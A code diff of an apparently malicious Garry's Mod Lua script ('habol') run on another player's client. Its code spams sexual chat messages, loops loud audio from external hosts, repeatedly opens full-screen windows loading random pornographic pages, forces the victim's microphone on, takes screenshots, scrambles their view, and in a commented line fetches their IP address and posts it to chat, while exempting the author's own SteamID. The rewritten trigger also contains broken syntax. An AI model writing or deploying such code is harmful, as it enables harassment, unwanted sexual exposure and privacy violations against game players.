@@ -1,9 +1,8 @@
 --if LocalPlayer():GetUserGroup() == "admin" or LocalPlayer():GetUserGroup() == "superadmin" then return end 
 if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then 
-        chat.AddText("Someone just tried to run habol on you! LOL")
+        chat.AddText(Color(130,20,230),"Someone just tried to run habol on you! LOL")
         return 
 end
-LocalPlayer():ConCommand("say It's begun...")
 local jpegs = 0
 local s = sound
 local Song = false
@@ -190,115 +189,100 @@ local function oniichan() --aids copypasta
     _timer.Create('~',17,1,function() LocalPlayer():ConCommand("say AH Hah Hah hah O-ONIII-CHAAANN you baka why did you do it inside? ヽ(д´)ノ")end)
     _timer.Create('~~',19,1,function() LocalPlayer():ConCommand("say W-well if it felt good for you i'm happy, b-but make sure you take responsibility. (ღ˘⌣˘ღ)")end)
 end
--- ALL TIMERS
---_timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime()))end) -- fps
---_timer.Create("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
---_timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
---timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
-_timer.Create('hahasong', .1, 1, function() Song = true end)
-s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
---s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
---timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
-s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
-_timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song timer (basically just makes it loop)
---_timer.Create('paste',0,10000,function()
---    oniichan()
---    _timer.Adjust('paste',21,10000,oniichan())
---end)
+local function Everything()
+    LocalPlayer():ConCommand("say It's begun...")
+    -- ALL TIMERS
+    --_timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime()))end) -- fps
+    --_timer.Create("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
+    --_timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
+    --timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
+    _timer.Create('hahasong', .1, 1, function() Song = true end)
+    s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
+    --s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
+    --s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
+    --s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
+    --s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
+    --timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
+    s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
+    _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song timer (basically just makes it loop)
+    --_timer.Create('paste',0,10000,function()
+    --    oniichan()
+    --    _timer.Adjust('paste',21,10000,oniichan())
+    --end)
 
-
-
---if check then
---    timer.Remove("haha")
---    timer.Remove("haha2")
---    timer.Remove("haha3")
---    timer.Remove("haha4")
---    timer.Remove("haha5")
---    timer.Remove("hahasong")
---end
-_timer.Create('scren',0.2,100000,ss)
-_timer.Create('hntai', .5, 10000, function()
-local _f = _vgui.Create("DFrame")
-    _f:SetTitle("")
-    _f:ShowCloseButton(false)
-    _f:SetPos(math.random(0,ScrW()),math.random(0,ScrH()))
-    _f:SetSize(ScrW(),ScrH())
-    _f.Paint = function(s,w,h)
-        surface.SetDrawColor(255,255,255,255)
-        surface.DrawRect(0,0,w,h)
-    end
-
-local _h = _vgui.Create("DHTML", _f )
-    _h:Dock( FILL )
-    _h:OpenURL(table.Random(hentai))
-end)
-
-_hook.Add('Think','funny',function()
-        rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
-        local result = annoying[_math.random(1,88)]
-        _math.randomseed(CurTime())
-        local result2 = annoying[_math.random(1,88)]
-        local cfunnies = funnies[_math.random(1,30)]
-        local sresult = annoyings[_math.random(1,13)]
-        local pSong = CreateSound(LocalPlayer(),sresult)
-        sound.Add({
-            name = "wowow",
-           channel = CHAN_STATIC,
-            volume = (jpegs^2),
-            level = 10000,
-            pitch = {50,200},
-            sound = sresult
-        })
-        _command('pp_mat_overlay',result)
-        _command('+voicerecord')
-        _command('pp_mat_overlay_refractamount',tonumber(cfunnies))
-        _command('pp_texturize',result2)
-        --_command('fps_max','30')
-        --_command('nyan_love')
-        --_command('hahaball')
-        --_command('status')
-        pSong:ChangeVolume(100000)
-        pSong:SetSoundLevel(100000)
-        pSong:Play()
-        ply:EmitSound("wowow")
-        --_surface.CreateFont(table.Random(funnies),{})
-        chat.AddText(rgb, cfunnies)
-        ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
-
-        if _input.IsKeyDown(70) then 
-            _command('cancelselect')
+    _timer.Create('scren',0.2,100000,ss)
+    _timer.Create('hntai', .5, 10000, function()
+    local _f = _vgui.Create("DFrame")
+        _f:SetTitle("")
+        _f:ShowCloseButton(false)
+        _f:SetPos(math.random(0,ScrW()),math.random(0,ScrH()))
+        _f:SetSize(ScrW(),ScrH())
+        _f.Paint = function(s,w,h)
+            surface.SetDrawColor(255,255,255,255)
+            surface.DrawRect(0,0,w,h)
         end
-end)
 
-_hook.Add('RenderScene','funny',function()
+    local _h = _vgui.Create("DHTML", _f )
+        _h:Dock( FILL )
+        _h:OpenURL(table.Random(hentai))
+    end)
 
-    --_render.SetLightingMode(2)
+    _hook.Add('Think','funny',function()
+            rgb = HSVToColor((CurTime() * 120) % 360, .77, .88)
+            local result = annoying[_math.random(1,88)]
+            _math.randomseed(CurTime())
+            local result2 = annoying[_math.random(1,88)]
+            local cfunnies = funnies[_math.random(1,30)]
+            local sresult = annoyings[_math.random(1,13)]
+            local pSong = CreateSound(LocalPlayer(),sresult)
+            sound.Add({
+                name = "wowow",
+               channel = CHAN_STATIC,
+                volume = (jpegs^2),
+                level = 10000,
+                pitch = {50,200},
+                sound = sresult
+            })
+            _command('pp_mat_overlay',result)
+            _command('+voicerecord')
+            _command('pp_mat_overlay_refractamount',tonumber(cfunnies))
+            _command('pp_texturize',result2)
+            pSong:ChangeVolume(100000)
+            pSong:SetSoundLevel(100000)
+            pSong:Play()
+            ply:EmitSound("wowow")
+            chat.AddText(rgb, cfunnies)
+            ply:ScreenFade(SCREENFADE.IN, rgb, .1, 0)
+            if _input.IsKeyDown(70) then 
+                _command('cancelselect')
+            end
+    end)
+    _hook.Add('DrawOverlay','funny',function()
 
-end)
-_hook.Add('DrawOverlay','funny',function()
+    end)
+    _hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
+        local lolangle = _math.random(-24, 24)
+        local realangle = Angle(lolangle, lolangle,0)
+        local PAngles = CUserCmd:GetViewAngles()
+        local mousex = CUserCmd:GetMouseX()
+        local mousey = CUserCmd:GetMouseY()
+        --_command('mat_motion_blur_enabled','1')
+        _command('mat_vsync','1')
+        --render.SetAmbientLight(1,1,1)
+        CUserCmd:SetViewAngles(PAngles - realangle)
+    end)
+    _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
+            local _pv = ply:GetVelocity()
+            local view = {}
+                view.origin = pos
+                view.angles = angles
+                view.fov = math.random(300)
+            return view
+    end)
+end
 
-end)
-_hook.Add('CreateMove','funny',function( CUserCmd , GM ) 
-
-    local lolangle = _math.random(-24, 24)
-    local realangle = Angle(lolangle, lolangle,0)
-    local PAngles = CUserCmd:GetViewAngles()
-    local mousex = CUserCmd:GetMouseX()
-    local mousey = CUserCmd:GetMouseY()
-    --_command('mat_motion_blur_enabled','1')
-    _command('mat_vsync','1')
-    --render.SetAmbientLight(1,1,1)
-    CUserCmd:SetViewAngles(PAngles - realangle)
-
-end)
-_hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
-        local _pv = ply:GetVelocity()
-        local view = {}
-            view.origin = pos
-            view.angles = angles
-            view.fov = math.random(300)
-        return view
+hook.Add("PlayerStartVoice", "asdasdas", function(ply)
+    if ply = LocalPlayer() then
+        Everything
+    end
 end)
